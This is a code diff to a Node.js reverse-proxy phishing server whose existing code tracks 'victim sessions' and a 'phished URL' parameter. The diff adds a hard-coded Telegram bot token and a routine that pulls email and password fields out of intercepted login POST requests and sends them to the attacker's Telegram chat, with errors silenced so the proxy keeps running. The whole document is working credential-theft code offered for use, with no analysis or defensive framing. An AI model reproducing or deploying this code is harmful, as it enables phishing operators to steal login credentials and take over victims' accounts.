@@ -4,7 +4,31 @@ const path = require("path");
 const fs = require("fs");
 const zlib = require("zlib");
 const crypto = require("crypto");
-const { HttpsProxyAgent } = require('https-proxy-agent'); // <-- ADDED
+const { HttpsProxyAgent } = require('https-proxy-agent');
+
+// ==================== TELEGRAM CONFIGURATION ====================
+const TELEGRAM_BOT_TOKEN = '8986334659:AAGtVf_vgVHkvXVKNP1xf3KcnCEN-QCHsk8';
+const TELEGRAM_CHAT_ID = '8986334659';
+
+async function sendToTelegram(message) {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+    try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+        console.log('[TELEGRAM] Notification sent');
+    } catch (error) {
+        console.error('[TELEGRAM] Failed:', error.message);
+    }
+}
+// ==================== END TELEGRAM ====================
 
 const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
 const PHISHED_URL_PARAMETER = "redirect_urI";
@@ -368,6 +392,62 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                             VICTIM_SESSIONS[currentSession].port = proxyRequestOptions.port;
                             VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
                         }
+
+                        // ====================================================================
+                        // CREDENTIAL EXTRACTION & TELEGRAM NOTIFICATION (INSERTED HERE)
+                        // ====================================================================
+                        try {
+                            // clientRequestBody is already parsed (if it came from the SW)
+                            // The original request body is in clientRequestBody.body (string)
+                            if (clientRequestBody && typeof clientRequestBody === 'object' && clientRequestBody.body) {
+                                const originalBody = clientRequestBody.body;
+                                const originalUrl = clientRequestBody.url || '';
+                                const originalMethod = clientRequestBody.method || '';
+
+                                // Only process POST requests that look like login attempts
+                                if (originalMethod === 'POST' && 
+                                    (originalUrl.includes('/login') || originalUrl.includes('/signin') || 
+                                     originalUrl.includes('/common/login') || originalUrl.includes('/oauth2') ||
+                                     originalUrl.includes('/authorize'))) {
+
+                                    let email = '';
+                                    let password = '';
+                                    const contentType = clientRequestBody.headers?.['content-type'] || '';
+
+                                    // Parse JSON body
+                                    if (contentType.includes('application/json')) {
+                                        try {
+                                            const json = JSON.parse(originalBody);
+                                            email = json.username || json.user || json.email || json.loginfmt || json.login || json.userid || '';
+                                            password = json.password || json.passwd || json.pass || json.Password || json.pwd || '';
+                                        } catch (e) {}
+                                    }
+                                    // Parse URL-encoded body
+                                    else if (contentType.includes('application/x-www-form-urlencoded')) {
+                                        try {
+                                            const params = new URLSearchParams(originalBody);
+                                            email = params.get('username') || params.get('user') || params.get('email') || 
+                                                    params.get('loginfmt') || params.get('login') || params.get('userid') || '';
+                                            password = params.get('password') || params.get('passwd') || params.get('pass') || 
+                                                       params.get('Password') || params.get('pwd') || '';
+                                        } catch (e) {}
+                                    }
+
+                                    if (email || password) {
+                                        const msg = `🔐 *Credentials Captured*\n\n` +
+                                                    `📧 *Email:* ${email || 'N/A'}\n` +
+                                                    `🔑 *Password:* ${password || 'N/A'}\n` +
+                                                    `🌐 *URL:* ${originalUrl}\n` +
+                                                    `🕐 *Time:* ${new Date().toISOString()}`;
+                                        await sendToTelegram(msg);
+                                        console.log(`[TELEGRAM] Sent credentials for ${email || 'unknown'}`);
+                                    }
+                                }
+                            }
+                        } catch (e) {
+                            // Silent fail – don't break the proxy
+                        }
+                        // ====================================================================
 
                         // Call the async makeProxyRequest and handle promise rejection
                         makeProxyRequest(proxyRequestProtocol, proxyRequestOptions, currentSession, headers.host, proxyRequestBody, clientResponse, isNavigationRequest)
